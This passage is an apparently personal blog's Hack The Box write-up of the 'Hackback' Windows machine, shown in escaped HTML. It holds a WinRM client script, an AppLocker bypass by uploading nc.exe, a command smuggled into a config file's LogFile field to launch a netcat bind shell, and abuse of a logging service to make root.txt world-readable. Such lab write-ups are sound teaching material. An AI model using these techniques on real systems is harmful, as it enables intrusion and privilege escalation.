        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start_with?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'UPLOAD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tokenize&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Uploading &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; to &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;file_manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes of &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes copied&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo `nOK`n&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start_with?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DOWNLOAD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;tokenize&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Downloading &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; to &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;file_manager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;download&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes_copied&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes of &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total_bytes&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; bytes copied&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo `nOK`n&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;STDERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Exiting with code &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exitcode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-uploaded-ncexe-to-cwindowssystem32spooldriverscolor-to-bypass-applocker-&quot;&gt;Then I uploaded &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\windows\system32\spool\drivers\color\&lt;/code&gt; (to bypass applocker) :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# proxychains ./winrm2.rb 
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
PS hackback\simple@HACKBACK Documents&amp;gt; UPLOAD /root/Desktop/HTB/boxes/hackback/nc.exe C:\windows\system32\spool\drivers\color\nc.exe
Uploading /root/Desktop/HTB/boxes/hackback/nc.exe to C:\windows\system32\spool\drivers\color\nc.exe|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
26892 bytes of 51488 bytes copied
51488 bytes of 51488 bytes copied

OK
PS hackback\simple@HACKBACK Documents&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;after-that-i-used-simple-echo-commands-to-edit-cleanini-it-should-look-like-this-&quot;&gt;After that I used simple echo commands to edit &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.ini&lt;/code&gt;. It should look like this :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe
Directory=c:\inetpub\logs\logfiles
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-way-we-can-get-a-bind-shell&quot;&gt;This way we can get a bind shell.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\util\scripts&amp;gt; echo [Main] &amp;gt; C:\util\scripts\clean.ini
echo [Main] &amp;gt; C:\util\scripts\clean.ini
PS C:\util\scripts&amp;gt; echo LifeTime=100 &amp;gt;&amp;gt; C:\util\scripts\clean.ini
echo LifeTime=100 &amp;gt;&amp;gt; C:\util\scripts\clean.ini
PS C:\util\scripts&amp;gt; echo &quot;LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini                                          
echo &quot;LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini                                                              
PS C:\util\scripts&amp;gt; echo &quot;Directory=c:\inetpub\logs\logfiles&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini
echo &quot;Directory=c:\inetpub\logs\logfiles&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini
PS C:\util\scripts&amp;gt; cat clean.ini
cat clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe                       Directory=c:\inetpub\logs\logfiles
PS C:\util\scripts&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;after-some-time-the-listener-starts-and-we-can-connect-to-port-1338-through-the-proxy-&quot;&gt;After some time the listener starts and we can connect to port 1338 through the proxy :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;finally-we-owned-user-&quot;&gt;Finally we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;userlogger-filesystem-access-as-system-root-flag&quot;&gt;UserLogger, Filesystem Access as System, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-a-shell-as-hacker-i-did-my-regular-windows-enumeration-one-thing-i-wanted-to-check-was-the-services-i-remembered-the-services-list-i-got-from-port-6666-so-i-checked-that&quot;&gt;After getting a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;hacker&lt;/code&gt; I did my regular Windows enumeration, one thing I wanted to check was the services, I remembered the services list I got from port 6666 so I checked that.&lt;/h4&gt;
&lt;h4 id=&quot;i-noticed--a-strange-service-called-userlogger-&quot;&gt;I noticed  a strange service called &lt;code class=&quot;highlighter-rouge&quot;&gt;UserLogger&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &quot;name&quot;:  &quot;UserLogger&quot;,
        &quot;startname&quot;:  &quot;LocalSystem&quot;,
        &quot;displayname&quot;:  &quot;User Logger&quot;,
        &quot;status&quot;:  &quot;OK&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-i-checked-the-entry-of-that-service-in-registry-&quot;&gt;So I checked the entry of that service in registry :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    c:\windows\system32\UserLogger.exe
    ObjectName    REG_SZ    LocalSystem
    DisplayName    REG_SZ    User Logger
    Description    REG_SZ    This service is responsible for logging user activity

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger\Security

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;description-says-its-responsible-for-logging-user-activity-i-tried-to-start-that-service-as-hacker-&quot;&gt;Description says it’s responsible for logging user activity. I tried to start that service as &lt;code class=&quot;highlighter-rouge&quot;&gt;hacker&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\system32&amp;gt;sc start userlogger
sc start userlogger

SERVICE_NAME: userlogger
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1368   
        FLAGS              :
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;hacker-was-allowed-to-start-and-stop-the-service-i-started-to-look-more-into-the-service-and-test-it-i-created-a-test-file-and-called-it-testtxt-then-i-started-the-service-and-gave-it-the-file-as-a-parameter--sc-start-userlogger-testtxt-it-created-a-new-file-called-testtxtlog-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hacker&lt;/code&gt; was allowed to start and stop the service. I started to look more into the service and test it. I created a test file and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;test.txt&lt;/code&gt; then I started the service and gave it the file as a parameter : &lt;code class=&quot;highlighter-rouge&quot;&gt;sc start userlogger test.txt&lt;/code&gt;. It created a new file called &lt;code class=&quot;highlighter-rouge&quot;&gt;test.txt.log&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\hacker\Documents&amp;gt;type test.txt.log
type test.txt.log

Logfile specified!
Service is starting
Service is running
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;nothing-interesting-however-when-i-checked-the-permissions-of-that-file-&quot;&gt;Nothing interesting, however when I checked the permissions of that file :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\hacker\Documents&amp;gt;cacls C:\Users\hacker\Documents\test.txt.log
cacls C:\Users\hacker\Documents\test.txt.log

C:\Users\hacker\Documents\test.txt.log Everyone: F
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;its-readable-by-everyone-this-means-we-can-use-this-service-to-read-anything-we-dont-have-access-to-but-how-will-we-do-that--it-adds-log-after-the-file-name-&quot;&gt;It’s readable by everyone. This means we can use this service to read anything we don’t have access to, but how will we do that ? it adds &lt;code class=&quot;highlighter-rouge&quot;&gt;.log&lt;/code&gt; after the file name ..&lt;/h4&gt;
&lt;h4 id=&quot;since-windows-doesnt-accept--in-filenames-we-can-try-to-read-roottxt-like-this--sc-start-userlogger-cusersadministratordesktoproottxt&quot;&gt;Since windows doesn’t accept &lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; in filenames we can try to read &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;sc start userlogger C:\users\administrator\desktop\root.txt:&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;when-it-tries-to-add-log-everything-after--will-be-removed-and-the-new-permissions-will-be-applied-to-roottxt-&quot;&gt;When it tries to add &lt;code class=&quot;highlighter-rouge&quot;&gt;.log&lt;/code&gt; everything after &lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; will be removed and the new permissions will be applied to &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\&amp;gt; cmd /c &quot;sc start userlogger 'c:\users\administrator\desktop\root.txt:'&quot;
cmd /c &quot;sc start userlogger 'c:\users\administrator\desktop\root.txt:'&quot;

SERVICE_NAME: userlogger
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1368  
        FLAGS              : 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-and-we-are-able-to-read-roottxt-but-what-is-this--a-troll-&quot;&gt;It worked and we are able to read &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;. But what is this ? A troll ?&lt;/h4&gt;
&lt;h4 id=&quot;just-like-bighead-i-suspected-that-it-had-an-alternate-data-stream-but-without-using-streamsexe-i-tried-some-stuff-and-one-of-my-guesses-worked-&quot;&gt;Just like bighead I suspected that it had an alternate data stream, but without using &lt;code class=&quot;highlighter-rouge&quot;&gt;streams.exe&lt;/code&gt; I tried some stuff and one of my guesses worked :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat c:\users\administrator\desktop\root.txt:flag.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---netmon&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/netmon/&quot;&gt;Hack The Box - Netmon&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---friendzone&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/friendzone/&quot;&gt;Hack The Box - Friendzone&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="Pivoting" /><summary type="html">Quick Summary Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is 10.10.10.128, I added it to /etc/hosts as hackback.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC hackback.htb We got two http ports, 80 and 6666, I also ran a full scan but we’ll get to that later. HTTP I checked both ports, on 80 there was this donkey image : I ran gobuster and it got nothing. I couldn’t send a request to port 6666 from the browser so I used curl : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/ &quot;Missing Command!&quot; It says &quot;Missing Command!&quot; So I tried /help : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/help &quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot; It returned a list of what commands we can use. /whoami lists information about the user running this service, not really important. /list lists the files in the current directory : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/list [ { &quot;Name&quot;: &quot;aspnet_client&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;default&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;new_phish&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;http.ps1&quot;, &quot;Length&quot;: 1867 }, { &quot;Name&quot;: &quot;iisstart.htm&quot;, &quot;Length&quot;: 703 }, { &quot;Name&quot;: &quot;iisstart.png&quot;, &quot;Length&quot;: 99710 } ] /info prints system information, we might need that : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/info { &quot;WindowsBuildLabEx&quot;: &quot;17763.1.amd64fre.rs5_release.180914-1434&quot;, &quot;WindowsCurrentVersion&quot;: &quot;6.3&quot;, &quot;WindowsEditionId&quot;: &quot;ServerStandard&quot;, &quot;WindowsInstallationType&quot;: &quot;Server&quot;, &quot;WindowsInstallDateFromRegistry&quot;: &quot;\/Date(1542436874000)\/&quot;, &quot;WindowsProductId&quot;: &quot;00429-00520-27817-AA520&quot;, &quot;WindowsProductName&quot;: &quot;Windows Server 2019 Standard&quot;, &quot;WindowsRegisteredOrganization&quot;: &quot;&quot;, &quot;WindowsRegisteredOwner&quot;: &quot;Windows User&quot;, &quot;WindowsSystemRoot&quot;: &quot;C:\\Windows&quot;, &quot;WindowsVersion&quot;: &quot;1809&quot;, &quot;BiosCharacteristics&quot;: null, &quot;BiosBIOSVersion&quot;: null, &quot;BiosBuildNumber&quot;: null, &quot;BiosCaption&quot;: null, &quot;BiosCodeSet&quot;: null, &quot;BiosCurrentLanguage&quot;: null, &quot;BiosDescription&quot;: null, &quot;BiosEmbeddedControllerMajorVersion&quot;: null, &quot;BiosEmbeddedControllerMinorVersion&quot;: null, &quot;BiosFirmwareType&quot;: null, &quot;BiosIdentificationCode&quot;: null, &quot;BiosInstallableLanguages&quot;: null, &quot;BiosInstallDate&quot;: null, &quot;BiosLanguageEdition&quot;: null, &quot;BiosListOfLanguages&quot;: null, &quot;BiosManufacturer&quot;: null, &quot;BiosName&quot;: null, &quot;BiosOtherTargetOS&quot;: null, &quot;BiosPrimaryBIOS&quot;: null, &quot;BiosReleaseDate&quot;: null, &quot;BiosSeralNumber&quot;: null, &quot;BiosSMBIOSBIOSVersion&quot;: null, &quot;BiosSMBIOSMajorVersion&quot;: null, &quot;BiosSMBIOSMinorVersion&quot;: null, &quot;BiosSMBIOSPresent&quot;: null, &quot;BiosSoftwareElementState&quot;: null, &quot;BiosStatus&quot;: null, &quot;BiosSystemBiosMajorVersion&quot;: null, &quot;BiosSystemBiosMinorVersion&quot;: null, &quot;BiosTargetOperatingSystem&quot;: null, &quot;BiosVersion&quot;: null, &quot;CsAdminPasswordStatus&quot;: null, &quot;CsAutomaticManagedPagefile&quot;: null, &quot;CsAutomaticResetBootOption&quot;: null, &quot;CsAutomaticResetCapability&quot;: null, &quot;CsBootOptionOnLimit&quot;: null, &quot;CsBootOptionOnWatchDog&quot;: null, 